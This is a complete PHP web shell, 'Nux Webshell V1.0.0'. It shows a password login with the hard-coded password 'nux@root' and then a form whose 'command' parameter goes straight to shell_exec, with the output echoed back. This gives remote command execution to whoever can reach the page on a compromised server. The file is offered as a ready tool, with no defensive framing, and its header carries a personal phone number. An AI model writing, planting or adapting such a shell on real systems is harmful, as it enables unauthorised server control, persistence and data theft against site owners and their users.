<?php

/*
--------------------------------
|    Nux Webshell V1.0.0       |
| https://github.com/nux-xader |
|  https://wa.me/6281251389915 |
--------------------------------
*/

session_start();
$password = "nux@root";

if (isset($_POST['submit'])) {
	if ($_POST['password'] == $password) {
		$_SESSION['password'] = $_POST['password'];
	}
}

 ?>

<!DOCTYPE html>
<html>
<head>
	<title>Nux-Webshell V1.0.0</title>

	<style type="text/css">
		body {
			background-color: black;
			font-family: sans-serif;
			color: white;
		}

		h1 {
			margin-top: 3%;
			text-align: center;
			color: cyan;
		}

		.login {
			margin-top: 8%;
			text-align: center;
		}

		.login #submit {
			margin-top: 1rem;
		}

		.cmd {
			margin-top: 8%;
			text-align: center;
		}

		#cmd {
			margin-top: 1rem;
		}

		.result-cmd {
			text-align: center;
			font-weight: bold;
			margin-top: 1rem;
		}
	</style>

</head>
<body>
	<h1>Nux-WebShell V1.0.0</h1>
	<?php if($_SESSION['password'] == $password) : ?>
		<form class="cmd" action="/" method="GET">
			$ <input type="text" name="command"> <br>
			<input type="submit" id="cmd" value="Execute">
		</form>
		<?php if (isset($_GET['command'])) : ?>
			<pre class="result-cmd"><?php echo shell_exec($_GET['command']); ?></pre>
		<?php endif ?>
	<?php else : ?>
		<form class="login" action="/" method="POST">
			<input type="password" name="password"> <br>
			<input type="submit" name="submit" id="submit" value="Login">
		</form>
	<?php endif ?>
</body>
</html>